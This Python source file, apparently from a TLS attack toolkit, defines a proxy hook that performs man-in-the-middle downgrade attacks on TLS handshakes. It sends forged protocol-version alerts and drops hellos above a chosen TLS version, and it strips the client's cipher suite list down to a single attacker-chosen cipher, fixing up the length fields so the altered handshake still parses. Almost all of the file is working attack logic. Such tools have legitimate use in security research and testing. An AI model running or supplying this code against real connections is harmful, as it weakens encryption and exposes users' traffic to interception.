import logging
import time

from tls_attack.structure.TLSHandshake import *
from tls_attack.structure.TLSClientHello import *
from tls_attack.structure.TLSServerHello import *
from tls_attack.structure.TLSAlert import *
from tls_attack.structure.TLSCipherSuiteStruct import *
from tls_attack.structure.TLSEmpty import *
from tls_attack.structure.TLSHeader import *
from tls_attack.structure.TLSSource import *

class AlterHandshake:
    def __init__(self, proxy):
        self.proxy = proxy
        self.cipher = None
        self.force_cipher = False
        self.compression = None
        self.certificate = None
        self.tls_version = None
        
    def start(self):
        self.proxy.on_packet_received(self._handle)

    def downgrade_cipher(self, cipher, force = False):
        self.cipher = cipher
        self.force_cipher = force

    def downgrade_tls_version(self, version):
        self.tls_version = version

    def downgrade_compression(self, compression):
        pass

    def replace_certificate(self, certificate):
        pass

    def _handle(self, connection, tls_object, state, source):
        # TLS version downgrade attack
        if not self.tls_version is None:
            if type(tls_object.body) is TLSHandshake:
                handshake = tls_object.body

                if type(handshake.body) is TLSClientHello or type(handshake.body) is TLSServerHello:
                    hello = handshake.body

                    if hello.version > self.tls_version:
                        alert_message = TLSHeader()
                        alert_message.content_type = TLSContentType.TLSAlert.value
                        alert_message.version = self.tls_version
                        alert_message.body = TLSAlert()
                        alert_message.body.level = TLSAlertLevel.WARNING
                        alert_message.body.description = TLSAlertDescription.PROTOCOL_VERSION
                        alert_message.length = len(alert_message.body.encode(state, source))

                        logging.warning("[%s] Sending TLS Fatal. %s" % (connection.id, str(alert_message.encode(state, source))))
                        self.proxy.send_packet(connection.id, source, alert_message.encode(state, source))

                        logging.warning("[%s] Dropping TLS Handshake of version '%s'." % (connection.id, hex(hello.version)))
                        return TLSEmpty()

        # Cipher suite downgrade logic
        if not self.cipher is None:
            if type(tls_object.body) is TLSHandshake:
                handshake = tls_object.body

                if type(handshake.body) is TLSClientHello:
                    client_hello = handshake.body
                    replace = self.force_cipher

                    # When the force flag is not on, we make sure the cipher we
                    # want to force is available for the client.
                    if not replace:
                        for struct in client_hello.cipher_suites:
                            if struct.cipher_suite == self.cipher:
                                replace = True
                                break

                    if replace:
                        logging.warning("[%s] Changing available cipher suite to '%s'." % (connection.id, str(self.cipher)))

                        cipher_suite_struct = TLSCipherSuiteStruct()
                        cipher_suite_struct.cipher_suite = self.cipher
                        client_hello.cipher_suites = [cipher_suite_struct]

                        # Updating the length field of the structures
                        client_hello.cipher_suites_length = len(cipher_suite_struct.encode(state, source))
                        handshake.length = len(handshake.body.encode(state, source))
                        tls_object.length = len(tls_object.body.encode(state, source))

                if type(handshake.body) is TLSServerHello:
                    server_hello = handshake.body


        return tls_object




